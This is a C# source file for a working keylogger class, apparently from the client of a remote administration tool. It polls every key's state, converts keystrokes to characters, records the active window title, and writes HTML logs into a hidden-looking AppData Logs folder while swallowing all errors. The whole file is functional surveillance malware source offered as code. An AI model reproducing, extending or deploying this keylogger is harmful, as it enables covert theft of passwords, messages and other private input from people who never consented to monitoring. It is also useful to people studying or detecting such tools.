using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.Keylogger;

namespace xClient.Core.Keylogger
{
    public class Logger
    {
        public static Logger Instance;

        public bool Enabled
        {
            get { return _timerLogKeys.Enabled && _timerFlush.Enabled && _timerEmptyKeyBuffer.Enabled; }
            set
            {
                _timerLogKeys.Enabled = _timerFlush.Enabled = _timerEmptyKeyBuffer.Enabled = value;
            }
        }

        private StringBuilder _logFileBuffer;
        private string _hWndTitle;
        private string _hWndLastTitle;

        private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                            "\\Logs\\";

        private readonly KeyloggerKeys[] _allKeys;
        private readonly KeyloggerKeys[] _specialKeys;
        private volatile List<LoggedKey> _keyBuffer;
        private readonly System.Timers.Timer _timerLogKeys;
        private readonly System.Timers.Timer _timerEmptyKeyBuffer;
        private readonly System.Timers.Timer _timerFlush;

        /// <summary>
        /// Creates the logging class that provides keylogging functionality.
        /// </summary>
        /// <param name="flushInterval">The interval, in milliseconds, to flush the contents of the keylogger to the file.</param>
        public Logger(double flushInterval)
        {
            Instance = this;
            _hWndLastTitle = string.Empty;

            WriteFile();

            _allKeys = GetKeyloggerKeys();
            _specialKeys = GetSpecialKeys();

            _keyBuffer = new List<LoggedKey>();

            this._timerLogKeys = new System.Timers.Timer { Enabled = false, Interval = 10 };
            this._timerLogKeys.Elapsed += this.timerLogKeys_Elapsed;

            this._timerEmptyKeyBuffer = new System.Timers.Timer { Enabled = false, Interval = 500 };
            this._timerEmptyKeyBuffer.Elapsed += this.timerEmptyKeyBuffer_Elapsed;

            this._timerFlush = new System.Timers.Timer { Enabled = false, Interval = flushInterval };
            this._timerFlush.Elapsed += this.timerFlush_Elapsed;

            this._logFileBuffer = new StringBuilder();
        }

        /// <summary>
        /// Retrieves an array of all keylogger keys that are special.
        /// </summary>
        /// <returns></returns>
        private KeyloggerKeys[] GetSpecialKeys()
        {
            List<KeyloggerKeys> SpecialKeys = new List<KeyloggerKeys>();

            try
            {
                foreach (KeyloggerKeys key in _allKeys)
                {
                    try
                    {
                        if (key.IsSpecialKey())
                        {
                            SpecialKeys.Add(key);
                        }
                    }
                    catch
                    { }
                }
            }
            catch
            { }

            return SpecialKeys.ToArray();
        }

        /// <summary>
        /// Retrieves an array of all keylogger keys that are supported.
        /// </summary>
        /// <returns></returns>
        private KeyloggerKeys[] GetKeyloggerKeys()
        {
            List<KeyloggerKeys> NormalKeys = new List<KeyloggerKeys>();

            try
            {
                foreach (KeyloggerKeys key in Enum.GetValues(typeof(KeyloggerKeys)))
                {
                    try
                    {
                        // Must be supported (have a string representation of the key).
                        if (!string.IsNullOrEmpty(key.GetKeyloggerKeyName()))
                        {
                            NormalKeys.Add(key);
                        }
                    }
                    catch
                    { }
                }

                return NormalKeys.ToArray();
            }
            catch
            {
                return new KeyloggerKeys[0];
            }
        }

        private string HighlightSpecialKey(string name)
        {
            if (!string.IsNullOrEmpty(name))
            {
                return string.Format("<font color=\"0000FF\">[{0}]</font>", name);
            }
            else
            {
                return string.Empty;
            }
        }

        private void timerEmptyKeyBuffer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            int j = 0;

            foreach (var k in _keyBuffer)
            {
                try
                {
                    // Make sure that the key that was logged is not null.
                    // If it is, we can safely ignore it by just making it
                    // stop here.
                    if (k != null)
                    {
                        // If any modifier key was set besides shift and caps
                        // lock, we will handle it differently than we would
                        // normal keys.
                        if (k.ModifierKeysSet)
                        {
                            // If the pressed key is special, it should be treated as such
                            // by using its provided name.
                            if (k.PressedKey.IsSpecialKey())
                            {
                                // The returned string could be empty. If it is, ignore it
                                // because we don't know how to handle that special key.
                                // The key would be considered unsupported.
                                string pressedKey = k.PressedKey.GetKeyloggerKeyName();

                                if (!string.IsNullOrEmpty(pressedKey))
                                {
                                    _logFileBuffer.Append(HighlightSpecialKey(pressedKey));
                                }
                            }
                            else
                            {
                                // The pressed key is not special, but we have encountered
                                // a situation of multiple key presses, so just build them.
                                _logFileBuffer.Append(HighlightSpecialKey(k.ModifierKeys.BuildString() +
                                                      FromKeys(k)));
                            }
                        }
                        // We don't have to worry about nearly all modifier keys...
                        // With the exception of the shift key and caps lock! :)
                        // At this point we know that shift or caps lock was the
                        // only pressed key.
                        else
                        {
                            // There is not really a need to handle if caps lock or
                            // shift has been handled because the way we obtain the
                            // value of the pressed key (that is not special) will
                            // use the key states and determine for us.
                            _logFileBuffer.Append(FromKeys(k));
                        }
                    }
                }
                catch
                { }

                j++;
            }

            if (j > 0 && j <= _keyBuffer.Count)
            {
                try
                {
                    _keyBuffer.RemoveRange(0, j);
                }
                catch
                { }
            }
        }

        private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            // Loop through each value in the array of keys to record.
            foreach (byte i in _allKeys)
            {
                // GetAsycKeyState returns the result by setting the most significant
                // bit if the key is up, and sets the least significant bit if the
                // key was pressed.
                if (Win32.GetAsyncKeyState(i) == -32767)
                {
                    try
                    {
                        LoggedKey KeyToLog = new LoggedKey() { PressedKey = (KeyloggerKeys)i };
                        KeyToLog.RecordModifierKeys();

                        _keyBuffer.Add(KeyToLog);
                        _hWndTitle = GetActiveWindowTitle(); //Get active thread window title

                        if (!string.IsNullOrEmpty(_hWndTitle))
                        {
                            // Only write the title to the log file if the names are different.
                            if (_hWndTitle != _hWndLastTitle)
                            {
                                _hWndLastTitle = _hWndTitle;
                                _logFileBuffer.Append("<br><br>[<b>" + _hWndTitle + "</b>]<br>");
                            }
                        }
                    }
                    catch
                    { }
                }
            }
        }

        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string fileName = _filePath + DateTime.Now.ToString("MM-dd-yyyy");

            try
            {
                if (!Directory.Exists(_filePath))
                    Directory.CreateDirectory(_filePath);

                if (!File.Exists(fileName))
                    writeHeader = true;

                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fileStream))
                    {
                        try
                        {
                            if (writeHeader)
                            {
                                sw.Write("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                         DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");

                                if (_logFileBuffer.Length > 0)
                                    sw.Write(_logFileBuffer);

                                _hWndLastTitle = string.Empty;
                            }
                            else
                                sw.Write(_logFileBuffer);
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {
            }

            _logFileBuffer = new StringBuilder();
        }

        private string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            Win32.GetWindowText(Win32.GetForegroundWindow().ToInt32(), sbTitle, sbTitle.Capacity);

            string title = sbTitle.ToString();

            return title != string.Empty ? title : null;
        }

        private IntPtr GetActiveKeyboardLayout()
        {
            uint pid;
            //Get the appropriate unicode character from the state of keyboard and from the Keyboard layout (language) of the active thread
            return Win32.GetKeyboardLayout(Win32.GetWindowThreadProcessId(Win32.GetForegroundWindow(), out pid));
        }

        private char? FromKeys(LoggedKey key)
        {
            //keyStates is a byte array that specifies the current state of the keyboard and keys
            //The keys we are interested in are modifier keys such as shift and caps lock
            byte[] keyStates = new byte[256];

            if (key.ModifierKeys.ShiftKeyPressed)
                keyStates[(int) KeyloggerKeys.VK_SHIFT] = 0x80;

            if (key.ModifierKeys.AltKeyPressed)
                keyStates[(int) KeyloggerKeys.VK_MENU] = 0x80;

            if (key.ModifierKeys.CtrlKeyPressed)
                keyStates[(int) KeyloggerKeys.VK_CONTROL] = 0x80;

            if (key.ModifierKeys.CapsLock)
                keyStates[(int) KeyloggerKeys.VK_CAPITAL] = 0x01;

            if (key.ModifierKeys.ScrollLock)
                keyStates[(int) KeyloggerKeys.VK_SCROLL] = 0x01;

            if (key.ModifierKeys.NumLock)
                keyStates[(int) KeyloggerKeys.VK_NUMLOCK] = 0x01;

            var sb = new StringBuilder(10);

            return Win32.ToUnicodeEx(key.PressedKey.GetKeyloggerKeyValue(), 0, keyStates, sb, sb.Capacity, 0, GetActiveKeyboardLayout()) == 1
                                     ? (char?)sb[0] : null;
        }
    }
}